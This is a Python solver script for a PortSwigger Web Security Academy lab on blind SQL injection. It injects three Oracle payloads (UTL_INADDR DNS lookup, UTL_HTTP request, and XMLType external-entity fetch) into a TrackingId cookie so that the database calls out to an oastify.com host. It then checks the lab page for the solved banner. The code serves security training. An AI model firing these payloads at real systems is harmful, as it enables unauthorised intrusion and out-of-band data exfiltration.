#!/usr/bin/env python3
"""
Blind SQL injection with out-of-band interaction
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 16-blind-out-of-band-interaction.md

What this does:
    Injects into the TrackingId cookie with three Oracle payload variants
    (UTL_INADDR DNS lookup, UTL_HTTP request, and an XMLType/EXTRACTVALUE
    external-DTD fetch), all pointed at a randomly generated subdomain under
    *.oastify.com -- the domain PortSwigger's own labs auto-detect
    interactions against, no separate Collaborator client required for this
    particular lab. Polls the lab's own page for the "Congratulations" banner,
    which the platform flips server-side once it sees the callback.

    IMPORTANT: raw Cookie headers are built manually rather than passed as a
    cookies dict -- httpx's cookie-jar handling mangles the special characters
    in these Oracle payloads.

Usage:
    python 16-blind-out-of-band-interaction.py <lab-url>

Requirements:
    pip install httpx
"""

import secrets
import sys
import time
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    seed = client.get(lab_url)
    tracking_id = seed.cookies.get("TrackingId", "xyz")
    session = seed.cookies.get("session", "")

    token = secrets.token_hex(16)
    oast = f"{token}.oastify.com"
    print(f"[*] OAST domain: {oast}")

    payloads = [
        f"'||(SELECT UTL_INADDR.get_host_address('{oast}') FROM dual)||'",
        f"'||(SELECT UTL_HTTP.request('http://{oast}/') FROM dual)||'",
        f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE x "
        f"[<!ENTITY % r SYSTEM \"http://{oast}/\">%r;]>'),'/x') FROM dual)||'",
    ]

    for i, payload in enumerate(payloads, 1):
        cookie = f"TrackingId={tracking_id}{payload}; session={session}"
        try:
            r = client.get(f"{lab_url}/filter", params={"category": "Gifts"}, headers={"Cookie": cookie})
            print(f"[*] Payload {i}: status={r.status_code} len={len(r.text)}")
        except Exception as e:
            print(f"[*] Payload {i}: error {e}")

    print("[*] Waiting for the platform to auto-detect the interaction...")
    for wait in (10, 10, 20, 20):
        time.sleep(wait)
        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- out-of-band interaction confirmed.")
            return
        print(f"    still waiting ({wait}s)...")

    print("[-] Not solved after 60s. Try re-running -- OAST callbacks can be delayed.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
